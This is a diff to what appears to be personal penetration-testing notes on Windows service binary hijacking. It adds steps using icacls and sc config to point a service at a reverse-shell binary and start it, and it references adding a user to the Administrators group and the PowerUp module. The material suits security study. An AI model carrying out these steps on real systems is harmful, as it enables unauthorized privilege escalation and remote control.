@@ -219,8 +219,9 @@ Get-UnquotedService
 ```
 
 ### Service Binary Hijacking
-```
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+```
+icacls "path"
 
 First Way -- Add user to local Administrator group:
 adduser.c:
@@ -254,9 +255,15 @@ whoami /priv(if SeShutdownPrivilege isn't present,  we would have to wait for th
 shutdown /r /t 0
 
 Automatic Script:
-cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
-Import-Module .\PowerUp.ps1
+PowerUp.ps1 ->
 Get-ModifiableServiceFile
+```
+```
+#Identify service from winpeas
+icalcs "path" #F means full permission, we need to check we have full access on the folder
+sc qc <servicename> #find binary path variable
+sc config <service> <option>="<value>" #change the path to the reverse shell location
+sc start <servicename>
 ```
 
 ### Service DLL Hijacking
